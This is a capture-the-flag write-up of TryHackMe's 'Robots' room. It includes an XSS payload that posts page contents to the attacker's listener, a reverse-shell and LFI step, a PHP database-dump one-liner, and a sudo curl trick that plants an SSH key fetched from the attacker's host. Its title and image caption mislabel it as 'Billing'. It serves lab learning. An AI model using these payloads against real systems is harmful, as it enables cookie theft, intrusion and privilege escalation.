---
title: TryHackMe Billing Write-Up Walk Through
date: 2025-03-17 08:00:00 +0200
categories: [TryHackMe, CTF, TryHackMe Write Up]
tags: [tryhackme,ctf, robots, ctf, apache2,SSRF, curl]
description: "Escalating from Web Shell to Root on TryHackMe Robots room"
comments: false
media_subpath: /assets/img/
image:
  path: TryHackMe-Robots.png
  alt: TryHackMe Robots
---

## Exploiting XSS to Root: A Technical Dive into TryHackMe's Robots.thm

TryHackMe's "Robots" is a rollercoaster of exploitation, blending web vulnerabilities with system-level privilege escalation. In this technical dive, I'll walk through how I went from an XSS flaw in a login form to full `root` access, leveraging `curl` and `apache2` along the way. Buckle up—here,s the path, with just enough detail to whet your appetite for the full video walkthrough.

**[You can follow YouTube video walk through here](https://youtu.be/ZAylF3vSzzQ)**

### Initial Foothold: XSS in Username Field

The journey begins with the login page (`http://robots.thm/login.php`). A quick test revealed the username field reflected input unsanitized. Injecting a simple XSS payload:

```html
<script>fetch('http://robots.thm/harm/to/self/server_info.php').then(r=>r.text()).then(t=>fetch('http://10.10.74.83:8000/catch',{method:'POST',body:t}))</script>
```

The idea here is when admin login we use above XSS payload to send us the content of the file `server_info.php` which contain the admin cookie

…dumped the admin session cookie to my listener (nc -lvnp 8000). The cookie granted access to admin portal with new endpoint admin.php, which has a PHP local file inclusion (LFI) vuln via the url parameter. Exploiting it by uploading php reverse shell, you can generate one here https://www.revshells.com/

**[You can follow YouTube video walk through here](https://youtu.be/ZAylF3vSzzQ)**


### Pivoting to rgiskard: A Database Twist

With shell access, I queried the MySQL database (mysql:host=db;dbname=web) using creds from config.php, a one line php code that can query users table:

```console
php -r '$pdo=new PDO("mysql:host=db;dbname=web;charset=utf8mb4","robots","q4qCz1OflKvKwK4S",[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);$r=$pdo->query("SELECT * FROM users");while($row=$r->fetch()){print_r($row);}'
```

From the code of the app (login.php and register.php) you can notice password is double md5 hash, you need to write script to decode the hash and use it (md5(password)) to ssh as the new  user.

As rgiskard, sudo -l exposed a juicy permission:

```console
sudo -l
# User rgiskard may run: (dolivaw) /usr/bin/curl 127.0.0.1/*
```

The wildcard (*) invited mischief. I used curl's `--connect-to` to redirect `127.0.0.1:80` to my server (`10.10.75.200:8000`), planting an SSH key:

```console
sudo -u dolivaw /usr/bin/curl 127.0.0.1/temp_ssh_key.pub --connect-to 127.0.0.1:80:10.10.75.200:8000 -o /home/dolivaw/.ssh/authorized_keys
```

then I generate temp SSH keys to login as the new user:

```console
ssh -i ~/.ssh/dolivaw_key dolivaw@robots.thm*
```

The user flag (`/home/dolivaw/flag.txt`) was mine.

## Root via Apache2: CustomLog Shell

As `dolivaw`, `sudo -l` offered a golden ticket:

```console
sudo -l
# User dolivaw may run: (ALL) NOPASSWD: /usr/sbin/apache2
```
I crafted an Apache config to execute a root shell via CustomLog:

**[You can follow YouTube video walk through here](https://youtu.be/ZAylF3vSzzQ)**

## Takeaways
This room blends XSS, LFI, sudo wildcard abuse, and Apache misconfiguration into a satisfying escalation chain. Want the nitty-gritty—config tweaks, pitfalls, and more? Check out my full walkthrough video:



# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/ZAylF3vSzzQ)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/ZAylF3vSzzQ)**

<img src="robotsyoutube.png"  alt="TryHackMe Billing" >


